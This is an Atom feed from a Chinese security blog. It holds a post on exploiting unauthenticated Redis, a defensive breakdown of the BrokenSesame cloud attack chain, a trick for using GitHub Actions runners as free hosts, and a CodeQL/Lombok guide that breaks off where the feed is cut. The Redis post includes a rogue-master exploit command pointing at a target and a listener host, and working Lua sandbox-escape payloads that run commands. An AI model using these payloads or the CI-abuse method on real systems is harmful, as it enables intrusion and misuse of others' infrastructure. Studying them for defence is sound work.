<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DV.K</title>
  
  
  <link href="http://blog.dvkunion.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.dvkunion.cn/"/>
  <updated>2023-11-03T21:25:20.032Z</updated>
  <id>http://blog.dvkunion.cn/</id>
  
  <author>
    <name>DV.K</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于Redis未授权利用的一些思考</title>
    <link href="http://blog.dvkunion.cn/2023/06/13/redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://blog.dvkunion.cn/2023/06/13/redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2023-06-13T13:29:08.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>Redis未授权利用的一些思考</h1><!-- split --><blockquote><p>一台未授权的redis，究竟能做些什么？</p></blockquote><span id="more"></span><h2 id="0x00-前言">0x00 前言</h2><p>问题如上。<br>其实真正遇到这个问题的时候我的第一反应也是没有当作一回事，毕竟redis未授权已经算得是和Top 10级别的漏洞一样耳熟能详的一个实战漏洞了，答案也是八股文张口就来：</p><ol><li>向web目录写入webshell</li><li>通过写入authotrized_keys获取ssh登录权限</li><li>通过crontab写入定时任务反弹shell</li></ol><p>这几个选项是最常用的，也是最通用化的redis利用方式。基本上在目前的搜索引擎上能够获取到大量的文章，一般的面试以及普通的ctf靶场也通常会针对这几个考点来展开。但是实际上：</p><ol><li>web路径未知，需要猜解或通过其他手段获取，或实际上在微服务分离的架构下redis服务器上不可能存在web服务，更有可能仅是一个redis容器。</li><li>redis主机没有暴露ssh端口，或根本不存在sshd服务，导致即使写入authotrized_keys，也无法实际利用。</li><li>运行redis服务的账户权限极低，无法向/root/.ssh写入文件。</li><li>redis主机没有crontab服务</li></ol><p>针对如上的限制，我们重新修改问题：</p><blockquote><p>一台未授权且仅包含redis服务(容器化)，暴露的端口只有6379的redis容器，除了上述的几个方面，还能做些什么？</p></blockquote><h2 id="0x03-主从复制-远程-so加载">0x03 主从复制 远程.so加载</h2><p>如果你足够细心和关注社区动态，那么在先知等平台</p><p>2019年7月7日，LC/BC的成员Pavel Toporkov在WCTF2019 Final分享会上介绍了Redis新版本的远程命令执行漏洞的利用方式。由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，<a href="http://xn--ghq48aq2ccin2afa388dzrbz19bmwa4y33uy0fplhhmalnz62t9jxdvhm1hsb25a.so">在未授权访问的情况下使被攻击服务器加载恶意.so</a> 文件，从而实现远程代码执行。</p><p>但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getsell了，在这种情况下，我们就需要其他的利用手段了。</p><p>此漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Redis 4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。</p><p>简单的说，攻击者（主机)写一个so文件，然后通过FULLRESYNC(全局)同步文件到受害人〈从机)上。</p><p><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">exp</a></p><p><a href="https://github.com/LoRexxar/redis-rogue-server.git">代码仓库</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost 118.193.36.37 --rport 57048 --lhost 98.126.111.111 --lport 23333</span><br></pre></td></tr></table></figure><h2 id="0x04-Redis沙盒逃逸">0x04 Redis沙盒逃逸</h2><p>Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。<br>Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。<br>我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令</p><p>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</p><p>eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;ls /tmp&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0</p><h2 id="0x05-考虑云场景下的环境">0x05 考虑云场景下的环境</h2><p>对于这种微服务架构、</p><h2 id="结尾">结尾</h2><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">exploit</a><br><a href="https://github.com/vulhub/vulhub/tree/master/redis">vulhub</a><br><a href="https://xz.aliyun.com/t/2295">先知-redis利用</a><br><a href="https://paper.seebug.org/975/">404-主从复制</a><br><a href="https://sec-in.com/article/1309">利用总结</a><br><a href="https://github.com/00theway/redis_exp">github-exp</a><br><a href="https://github.com/Ridter/hackredis">检测工具</a><br><a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">其他</a></p><h4 id="参考链接">参考链接</h4><blockquote><p>0.exp : <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a><br>1.代码仓库 : <a href="https://github.com/LoRexxar/redis-rogue-server.git">https://github.com/LoRexxar/redis-rogue-server.git</a><br>2.exploit : <a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a><br>3.vulhub : <a href="https://github.com/vulhub/vulhub/tree/master/redis">https://github.com/vulhub/vulhub/tree/master/redis</a><br>4.先知-redis利用 : <a href="https://xz.aliyun.com/t/2295">https://xz.aliyun.com/t/2295</a><br>5.404-主从复制 : <a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br>6.利用总结 : <a href="https://sec-in.com/article/1309">https://sec-in.com/article/1309</a><br>7.github-exp : <a href="https://github.com/00theway/redis_exp">https://github.com/00theway/redis_exp</a><br>8.检测工具 : <a href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a><br>9.其他 : <a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Redis未授权利用的一些思考&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;blockquote&gt;
&lt;p&gt;一台未授权的redis，究竟能做些什么？&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Bugs" scheme="http://blog.dvkunion.cn/categories/Bugs/"/>
    
    
    <category term="漏洞跟踪" scheme="http://blog.dvkunion.cn/tags/%E6%BC%8F%E6%B4%9E%E8%B7%9F%E8%B8%AA/"/>
    
    <category term="开发工具" scheme="http://blog.dvkunion.cn/tags/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>蓝军视角:阿里云 RCE 战火余烬下的启示</title>
    <link href="http://blog.dvkunion.cn/2023/05/25/%E9%98%BF%E9%87%8C%E4%BA%91%20RCE%20%E6%88%98%E7%81%AB%E4%BD%99%E7%83%AC%E4%B8%8B%E7%9A%84%E5%90%AF%E7%A4%BA/"/>
    <id>http://blog.dvkunion.cn/2023/05/25/%E9%98%BF%E9%87%8C%E4%BA%91%20RCE%20%E6%88%98%E7%81%AB%E4%BD%99%E7%83%AC%E4%B8%8B%E7%9A%84%E5%90%AF%E7%A4%BA/</id>
    <published>2023-05-25T17:11:10.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>蓝军视角: 阿里云 RCE 战火余烬下的启示</h1><!-- split --><p>2023年4月19日，Wiz Research 在文章 <a href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services</a> 中披露了被命名为<code>BrokenSesame</code>的一系列阿里云数据库服务漏洞，向我们展示了如何从一个容器逃逸漏洞，与私有仓库写权限的组合，最终实现RCE的攻击链路。该漏洞最终可导致未授权访问阿里云客户的PostgreSQL数据库，并且可以通过在阿里巴巴的数据库服务执行供应链攻击。</p><p>时隔一个月，在经过研究与复现的过程中，不由得感叹攻击者的构思巧妙；而反过来作为防守人员，我们能否在这次战役中，吸取一些教训？让我们站在蓝军的视角再看一遍完整的攻击路程。</p><span id="more"></span><h2 id="0x01-容器提权">0x01 容器提权</h2><p>在原文中，作者分享了两个案例：ApsaraDB RDS for PostgreSQL 和  AnalyticDB for PostgreSQL。 两个案例的第一步均为容器提权：从普通账户提权至更高的权限。 在这一步中，两个案例分别用到了不同的攻击链路：</p><ul><li>cron定时任务'/usr/bin/tsar' -&gt; 高权限执行的二进制文件 -&gt; 可修改的动态链接库 -&gt; 覆盖链接库 -&gt; 定时任务出发执行获取root权限。</li><li>容器共享目录 -&gt; 业务特性导致任意文件读取（符号链接）-&gt;  获取到另一个容器的读取下权限。</li></ul><p>在这两个链路中，链路1实际上是在渗透过程中最常使用的一种攻击方式，通过注入恶意动态链接库实现账户提权。这条链路涉及到了两个关键的问题点：cron定时任务的启动权限和动态链接库权限。cron的高权限导致所有定时任务都通过高权限账户root来执行，而可修改的动态链接库权限导致覆盖动态链接库；</p><p><img src="/img/1681856311-screenshot-2023-04-18-at-15-18-07.png" alt="链路1"></p><p>针对这两个风险点，传统的HIDS文件监控即可覆盖到该层面。除此之外，对于添加进入定时任务的二进制程序，应该严格限制其权限，包括动态链接库文件。</p><p>在第二条链路中，我们发现实际上业务在设计架构模式上时，使用了共享容器的目录来实现通信；但业务代码并没有考虑符号链接的场景，导致了第二个文件下的任意文件读取。</p><p>整体来看，链路1和链路2分别属于的HIDS主机监控/黑白盒业务安全扫描的范畴，说明即使在云场景下，传统的业务安全依旧处于重要地位。</p><h2 id="0x02-容器逃逸">0x02 容器逃逸</h2><p>获取到容器root权限后，下一步便是朝着宿主机进行攻击，同样是两条链路：</p><ul><li>共享pid namespcae -&gt; 监听发现共享的挂载目录'/home/adbpgadmin' -&gt; 植入ssh/config获取容器B权限 -&gt; 通过容器B的docker.sock 逃逸至宿主机。</li><li>由提权过程中的任意文件读取获取到业务代码 -&gt; 代码审计发现命令注入 -&gt; 通过命令注入获取到特权容器的shell -&gt; 通过<code>core_pattern</code>实现容器逃逸。</li></ul><p>在这两条链路中，攻击者使用了两种不同的逃逸方式：共享namespace导致攻击者获取到更多信息、挂载docker.sock导致逃逸、特权容器复写core_pattern导致逃逸；这几种方式是云环境中比较经典的逃逸场景，使得容器绕过各种隔离限制，对容器外的宿主机或其他容器的资源进行操作。</p><p>如何对容器逃逸进行防御？传统的业务安全和主机安全并没有针对主机cgroups和namespace的防御设计；结合云原生的架构模式，可以在两个环节建设容器逃逸检测。</p><ul><li>DevSecOps安全左移，对代码仓库构建产物的IaC(基础设施即代码)进行审查，在开发阶段对可能存在逃逸风险的配置项问题进行阻断，防止出现各类逃逸问题。</li><li>运行时监测, 对于已经上线并实际运行的业务容器，实时监控逃逸特征。通过订阅内核事件，抓取可能为逃逸的行为特征，结合当前运行中的容器配置信息进行分析，综合给出是否存在逃逸风险以及是否发生逃逸事件的告警。</li></ul><p>结合这两点，可以做到对逃逸风险的有效控制，防止攻击者进一步的攻击行为。</p><h2 id="0x03-横向扩散">0x03 横向扩散</h2><p>在实现逃逸后，获取到的数据就越来越宽泛。</p><ul><li>通过k8s节点存储凭证可获取各种敏感资源如secrets、configmaps。</li><li>通过imagePullSecrets获取到了私有镜像仓库权限。</li><li>环境变量中存储了access_keys等敏感信息。</li><li>其他用户的pod信息等。</li></ul><p>可以看到，在实现了容器逃逸后，攻击者轻松从各种凭证信息实现横向扩撒，包括各类敏感资源数据、镜像仓库权限等等；这好比在传统的渗透中，从DMZ区进入到了内网环境后，发现大多主机MS-17010通杀的场景；说明对于云环境下的节点管理，仍需要加强警惕，尤其是在容器逃逸防护较弱的场景下。</p><p>针对这部分横向移动与扩散的攻击行为，可以和容器逃逸一样分为两个方面进行防护：</p><ul><li>事前防护：对镜像资产/容器资产进行扫描，保证镜像/容器内没有敏感信息以及过高的凭证信息。</li><li>事中防护：通过对集群日志审计来发现横向移动行为，快速响应并隔离问题容器。</li></ul><h2 id="0x04-综合反思">0x04 综合反思</h2><p>回顾整条攻击链，我们可以总结以下几点：</p><p><strong>传统的业务安全在云原生环境下依旧处于重要地位</strong><br>回看整个攻击过程，所有的切入点仍然是一个容器服务。虽然容器提供了相对隔离的运行环境，但传统的业务安全如：web安全所导致的问题依旧作为了云安全事件中的切入点，其地位不亚于弱口令。</p><p><strong>云环境的场景下，传统安全的危害效应将指数级放大</strong><br>云环境中的配置复杂，一旦存在了配置不当的情况，攻击者便可以轻易的将攻击从一个容器扩散到一台主机、一个集群、甚至于多个集群、整个k8s环境。此时，作为入侵的入口导致的影响指数级上升。</p><p><strong>云环境的场景下，容器逃逸是整个攻击链路的核心</strong><br>在整个攻击的步骤中，我们可以总结出：攻击者获取到一个容器的最高权限后，必须千方百计的实现逃逸来绕过各种资源限制，才能够产生更为严重的影响；因此，云环境场景下，逃逸问题是连接传统安全与云安全的关键核心。</p><p><strong>云环境对基础设施的监控、审计需求更加复杂和迫切</strong><br>云计算的特性使得基础设施的边界变得模糊，资源的动态变化增加了管理和保护的难度，同时多租户环境下的安全性和合规性风险也需要得到充分的关注和解决，带有缺陷的隔离限制将轻易的导致用户数据泄露。</p><p>同时，我们也能看到，云环境的场景下，对于蓝军防守方，提供了一个新的思路：<div color=red><strong>在面对传统安全覆盖率永远无法达到100%以及层出不穷的0day漏洞，加强对云安全防护以及逃逸检测能够有效的中断攻击链路，降低攻击危害，实现低成本/高回报率的防护。</strong></div></p><p>针对对以上的问题，牧云-云原生安全平台提供了完整的监控与检测方案，深入监控了每一个容器的生命周期，在传统的webshell、反弹shell等安全入侵能力检测上，结合云环境特点，实现了容器逃逸风险监测、集群日志审计等功能，帮助您清晰明了的掌控集群的实时安全；当发生安全事件时，黑客的恶意行为和特征将会被检测与捕捉，实时反馈到平台中。</p><p><img src="/img/16842061452391.png" alt="img.png"></p><p>除此之外，为保证供应链安全，牧云-云原生安全平台提供了定时任务机制和多种多样的资源集成，定时检测您的镜像仓库等远端资源，第一时间发现风险镜像，包括敏感信息泄漏、恶意文件、软件漏洞等问题。并通过配置可以阻断来自于该镜像的容器创建请求以及镜像构建请求，防止攻击扩散。</p><p><img src="/img/16842062957916.png" alt="资源集成"></p><p>与此同时，牧云-云原生安全还考虑了云场景下资源迭代的快速以及漏洞响应的及时性，设计了插件系统，结合开源社区安全检测能力的沉淀，能够快速赋能最新漏洞检测需求，并热更新于平台中，提供与时俱进的插拔式安全检测能力；如前一阵子出现的Minio漏洞（CVE-2023-28432），可以通过快速插入专项检测插件来实现0 day速查。</p><p><img src="/img/16842062518677.png" alt=""></p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services : <a href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;蓝军视角: 阿里云 RCE 战火余烬下的启示&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;p&gt;2023年4月19日，Wiz Research 在文章 &lt;a href=&quot;https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r&quot;&gt;Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services&lt;/a&gt; 中披露了被命名为&lt;code&gt;BrokenSesame&lt;/code&gt;的一系列阿里云数据库服务漏洞，向我们展示了如何从一个容器逃逸漏洞，与私有仓库写权限的组合，最终实现RCE的攻击链路。该漏洞最终可导致未授权访问阿里云客户的PostgreSQL数据库，并且可以通过在阿里巴巴的数据库服务执行供应链攻击。&lt;/p&gt;
&lt;p&gt;时隔一个月，在经过研究与复现的过程中，不由得感叹攻击者的构思巧妙；而反过来作为防守人员，我们能否在这次战役中，吸取一些教训？让我们站在蓝军的视角再看一遍完整的攻击路程。&lt;/p&gt;</summary>
    
    
    
    <category term="Bugs" scheme="http://blog.dvkunion.cn/categories/Bugs/"/>
    
    
    <category term="云安全" scheme="http://blog.dvkunion.cn/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞跟踪" scheme="http://blog.dvkunion.cn/tags/%E6%BC%8F%E6%B4%9E%E8%B7%9F%E8%B8%AA/"/>
    
  </entry>
  
  <entry>
    <title>白嫖国外主机新思路</title>
    <link href="http://blog.dvkunion.cn/2023/02/24/%E7%99%BD%E5%AB%96%E5%9B%BD%E5%A4%96%E4%B8%BB%E6%9C%BA%E6%96%B0%E6%80%9D%E8%B7%AF/"/>
    <id>http://blog.dvkunion.cn/2023/02/24/%E7%99%BD%E5%AB%96%E5%9B%BD%E5%A4%96%E4%B8%BB%E6%9C%BA%E6%96%B0%E6%80%9D%E8%B7%AF/</id>
    <published>2023-02-24T13:01:12.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>白嫖国外主机新思路</h1><!-- split --><blockquote><p>免责声明: 本文属于纯思路探讨，使用demo代码所造成的影响与作者无关。</p></blockquote><span id="more"></span><h2 id="前言">前言</h2><p>近日，百川云平台发布了新的产品：牧云主机管理助手。可以帮助用户简单、轻量级的进行主机管理。</p><p><img src="/img/d946d58b-8d6b-4ddb-a7f5-50a7d749214f.png" alt=""></p><p>很快啊，在体验了一波基本功能后，发现主机助手真的很便捷：</p><ul><li>一键安装，秒级同步</li><li>家里的虚拟机再也不用通过端口转发这种粗暴的方式来提供远程使用</li><li>各云厂商的主机再也不用记IP登陆</li><li>换一台全新的电脑也能够立马投入工作，优雅的远程连接到了自己的服务器（elegant~)</li><li><strong>三台主机内还是免费使用</strong></li></ul><p>一番把玩后，作为一个白嫖怪，还是发现了一个盲点：</p><blockquote><p>牧云主机管理助手的定位是：主机管理工具。<br>那么对于白嫖怪来说，我连主机都没有，该怎么办呢？</p></blockquote><h2 id="打开格局">打开格局</h2><p>早期在关注主机白嫖这个方向时，除了各种云厂商的学生党羊毛，还曾注意到一个思路，那就是现在众多的CI平台。</p><p>随着云原生环境的不断发展，越来越多的厂商开始接受DevOps的思路，持续集成(CI)也成为了必不可缺的一个环节。通过持续集成，开发者可以快速、自动、可重复的将代码进行测试、编译、打包等步骤，从源代码生成发布版本。</p><p><img src="/img/908ac14a-013b-491d-ad24-9c67d877508a.png" alt=""></p><p>而持续集成的整个环节，都会提供一个环境供流程进行自动构建。这个执行构建的主机自然就成了我们白嫖怪的目标。</p><p>在最初的思路中，我们能够获取主机操作权限的方式，第一反应通常都是<code>ssh</code>,因此，现有的白嫖版本都是通过各种ssh模拟服务来连接到action VM环境中。（<a href="https://p3terx.com/archives/ssh-to-the-github-actions-virtual-server-environment.html">https://p3terx.com/archives/ssh-to-the-github-actions-virtual-server-environment.html</a> )</p><p>但是在实际使用中，由于ssh交互的问题，很容易导致断开连接后，整个环境丢失。使用的体验上并没有那么舒适。</p><p>结合最近出现的牧云主机管理助手，突发奇想：能否通过牧云主机助手的方式，来获取到action VM的权限呢？</p><h2 id="实际测试">实际测试</h2><p>如此，我们要做的事情就很明确了：</p><ul><li>让CI执行牧云主机助手部署的脚本</li><li>因为部署脚本是daemon模式，所以我们需要sleep来维持CI存活的状态。</li></ul><p>仅需两步，我们就可以获取到了一个免费的 E5 2vCPU/​7G RAM/​90G SSD主机。</p><p><img src="/img/f2e36e56-ad04-4d72-b3cc-592ff8109dc3.png" alt=""></p><p>为了方便使用，我将上述思路打包成了<a href="https://github.com/marketplace/actions/dvkunion-collie">Github Action</a>，详细代码可以查看 <a href="https://github.com/DVKunion/collie_tricker">Github仓库</a>, 方便开发者快速进行接入。</p><h2 id="使用场景">使用场景</h2><p>在执行Github Action时，无法登陆到实际执行的VM环境中来进行debug，检查构建失败的真正原因。</p><p>此时可以使用上述GitHub action, 通过牧云主机管理助手登陆到debug action的环境中，手动check构建失败的问题，从而避免了修改workflows来进行debug的麻烦方式。</p><p>该场景仅作为抛砖引玉，除此之外，我相信实际能够应对的场景仍有很多，而且牧云主机管理助手仍在以腹泻式进行迭代更新，欢迎大家探索和分享出更多的玩法～</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Github Action : <a href="https://github.com/marketplace/actions/dvkunion-collie">https://github.com/marketplace/actions/dvkunion-collie</a><br>1.Github仓库 : <a href="https://github.com/DVKunion/collie_tricker">https://github.com/DVKunion/collie_tricker</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;白嫖国外主机新思路&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;blockquote&gt;
&lt;p&gt;免责声明: 本文属于纯思路探讨，使用demo代码所造成的影响与作者无关。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="tools" scheme="http://blog.dvkunion.cn/categories/tools/"/>
    
    
    <category term="主机" scheme="http://blog.dvkunion.cn/tags/%E4%B8%BB%E6%9C%BA/"/>
    
    <category term="国外" scheme="http://blog.dvkunion.cn/tags/%E5%9B%BD%E5%A4%96/"/>
    
    <category term="工具" scheme="http://blog.dvkunion.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 踩坑指南</title>
    <link href="http://blog.dvkunion.cn/2022/03/24/CodeQL-%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/"/>
    <id>http://blog.dvkunion.cn/2022/03/24/CodeQL-%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97/</id>
    <published>2022-03-24T10:02:00.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>CodeQL 踩坑指南 - Java</h1><!-- split --><p>讲解这东西的大师傅们太多了，不班门弄斧了，这里仅针对一些踩过的坑点提供一些自己的解决方案，希望能对一些师傅提供点帮助。</p><span id="more"></span><h2 id="坑I-Lombok">坑I - Lombok</h2><h3 id="场景">场景</h3><p>在构建一些小型cms和自己的一些项目时，突然发现构建好的数据库内源码比实际的源码少了一大半，导致很多规则分析的flow直接断掉了，什么规则扫描结果都没有。</p><h3 id="原因">原因</h3><p>构建好的数据库文件夹下，源码是存放在src.zip下的。通过vscode的插件，将数据库添加后也可以看到构建加载后的源码。通过对比源码，发现丢失的java文件都存在lombok注解（@Data/@Sl4j)。<br><img src="media/16479334970645.jpg" alt=""></p><p>这里的原因就是由于项目使用了lombok。根据官方<a href="https://github.com/github/codeql/issues/8363">Github Issue</a>可得知，lombok 代码在编译期间使用注释处理器转换为正确的 Java 代码。这会干扰 CodeQL 分析器，该分析器会在源代码转换为有效的 Java 代码之前“查看”源代码，从而导致它跳过此类文件。</p><h3 id="解决方案">解决方案</h3><p>按照官方的思路，解决方式就是将所有文件还原为不使用lombok的方式。还原的方案主要有两种：</p><p><strong>1.通过Lombok.jar 直接还原文件</strong></p><p>在官方的<a href="https://github.com/github/codeql/issues/4984#:~:text=Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A">Github Issue</a>提供了一种方式。</p><p>下载项目对应版本的lombok.jar(或者从External Libraries寻找下载好的依赖jar包)，运行：</p><p><code>java -jar lombok.jar delombok . -d &quot;delombok-code&quot;</code><br>这会将当前目录下的所有使用了lombok的代码还原为不使用的状态，并存放在delombok-code这个目录下。</p><p>但是在实际测试中，这种方式不会对项目内关联的代码进行还原，比如自己定义的一些TO类，在这种方式的还原下只会被还原成Object，而不是实际的TO对象。可能会对代码分析造成一定的影响。</p><p><strong>2. 使用maven-delombok</strong><br>这种方式的好处在于可以在maven build的过程中来对lombok进行还原，可以很好的解决依赖关系，不会出现上述还原为未定义的Object的场景。</p><p>在pom文件内增加：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>delombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.basedir&#125;/src/main/lombok<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于将所有的还原lombok指向目录/src/main/lombok，所以在maven编译的时候，我们希望编译的是lombok还原后的目录，这样codeql才能够读取整个有效的过程，所以需要修改sourceDirectory</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>$&#123;project.basedir&#125;/src/main/lombok</span><br><span class="line">        <span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">        ......</span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里提供一个脚本, 快速插入lombok-plugins，将脚本放置项目根目录并运行<code>python3 delombok.py ./pom.xml </code>即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delbankline</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = [x <span class="keyword">for</span> x <span class="keyword">in</span> f.readlines() <span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">r&#x27;^\s+$&#x27;</span>, x)]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">        fw.writelines(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delombok</span>(<span class="params">file</span>):</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">lines = f.readlines()</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">f.truncate()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"><span class="comment"># 